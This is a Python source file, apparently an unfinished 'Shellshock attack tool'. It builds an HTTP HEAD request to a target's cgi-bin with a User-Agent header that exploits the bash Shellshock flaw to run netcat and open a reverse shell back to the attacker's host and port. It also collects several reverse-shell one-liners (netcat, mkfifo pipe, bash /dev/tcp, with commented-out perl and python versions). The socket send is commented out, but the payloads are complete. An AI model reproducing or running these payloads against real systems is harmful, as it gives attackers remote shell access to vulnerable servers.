import sys
import requests
import urllib.request
import socket
# Consists of the HEAD request which is sent in addition to the custom headers
def shellshock_http_req(lhost, lport, rhost, rport, target_url):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   # Connect a socket to the target running cgi-bin
   sock_connect = s.connect((rhost, rport))

   ''' HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" '''
   # The sendall function sends the data we need. It's needed to encode the variables before inserting otherwise they're treated like a string. Encoding the data helps with the data being sent as bytes
   rhost_encoded = rhost.encode() 
   lhost_encoded = lhost.encode()
   # This contains a list of all the payloads which will be sent in a loop to segment all of the payloads
   # No encoding should be made to the function call 
   rev_payload = shellshock_rev_payloads(lhost, lport)
   #lport_encoded = lport.encode()
   # This request requires appropriate encoding of each parameter which gets added and these parameters need to be placed into a tuple of their own in which you can then place more than one formatting argument
   #payload = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded)
   payload = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded)
   #s.sendall(payload)
   print(payload)
   #payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
   #payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded))
   # Proof of concept payload in which reverse payloads are arbitrary and not declared statically in the socket
   #payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (rev_payload, rhost_encoded))
   #for payloads in rev_payload:
       # List containing all of the payloads
        # All of the individual payloads. They're lacking the byte encoding of the host which is why a shell is not caught
        #print(payloads)
   #    payloads_encoded = payloads.encode()
   #     payload = s.sendall(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (payloads, rhost_encoded))
       #print(payloads)
       # Need to send these bytes in a socket, for testing purposes they're being printed to show what will be redirected to the socket later 
   #    payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (payloads_encoded, rhost_encoded))
   #payload = print(b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; %s\r\nHost: %s\r\nConnection: close\r\n\r\n" % (rev_payload, rhost_encoded))
   # Payload needs to be added in accordance with the for loop of several payloads. A single variable of payload should be expected which should fulfil the conditions of all required parameters as part of the HEAD request and user agent modification   

   ''' Don't even need the recv data because the data isn't even coming back to the program... We just fire the payload off that's it '''
   #recv_data = s.recv(4096)
   #sys.exit("Sent payload, aight imma head out")
   '''
   Need a way to find out if the socket connected successfully or not and then inform the user
   '''

   # Socket is closed
   #s.close()

   #return payload
''' Paste in the URL from the shellshock_dect tool '''


''' All local host entries need to be encoded using .encode() so that the payloads can execute properly in the request '''
def shellshock_rev_payloads(lhost, lport):
    ''' WE DON'T NEED TO CRAFT ANYMORE URLs!!! Because, we already have the one we're looking for; we just need to work with it '''
    ''' This is just a text value, no network ops happening '''
    reverse_payloads = []
    ''' Old netcat '''
    reverse_payload_1 = 'nc -e /bin/sh {} {}'.format(lhost, lport)
    ''' Make our reverse shell a binary. Deliver it to target via wget. Wget would be achieved by command execution.
    Host a python server externally, the server downloads your payload. You then issue a reverse shell using netcat
    but instead of -e /bin/sh, you do -e /dev/shm/revpy <- Alias for payload. That's how we'd deliver it. Then catch it on our side
    with full PTY support unlike /bin/sh and other capabilities if we want'''
    ''' New netcat '''
    reverse_payload_2 = "rm /tmp/f;mkfifo  /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc {} {}".format(lhost, lport)
    reverse_payload_3 = "bash -i >& /dev/tcp/{}/{} 0>&1".format(lhost, lport)
    #reverse_payload_4 = "perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'".format(lhost, lport)
    #reverse_payload_5 = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("111",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["\bin/sh","-i"]);'".format(lhost, lport)
    reverse_payloads.append(reverse_payload_1)
    reverse_payloads.append(reverse_payload_2)
    reverse_payloads.append(reverse_payload_3)
    #reverse_payloads.append(reverse_payload_4)
    #reverse_payloads.append(reverse_payload_5)
    #word_response = requests.get(target_url).status_code
    return reverse_payloads

def main():
    lhost = sys.argv[1]
    lport = int(sys.argv[2])
    rhost = sys.argv[3]
    rport = int(sys.argv[4])
    ''' We get this URL from the shellshock_dect tool '''
    target_url = sys.argv[5]
    print("Shellshock attack tool")
    print("Sending payload\nEnsure to have a listener open on {}".format(lport))
    # This is what we pass into the HEAD request which actually performs shellshock
    payload = shellshock_http_req(lhost,lport,rhost, rport, target_url)
    #Just a GET request ATM. Needs to have a socket attached
    #result = shellshock_rev_payloads(lhost, lport, target_url)
    result = shellshock_rev_payloads(lhost, lport)
    print("List of payloads to inject")
    for rev_payload in result:
        #print(payload)
        print(rev_payload)
    ''' 
    The payloads should cycle from 1 - ... here until one payload connects back to us 
    Create sockets back to us which contain the payloads
    '''

    ''' 
    Get all the rev shells to send in a get request
     '''

    #    print("Reverse shell payload(s): {}".format(rev_payload))
    '''
    rev_sock.connect(lhost, lport) - This will create a socket and then send the payload to target and then we get shell (Reverse shell payload)
    '''
main()
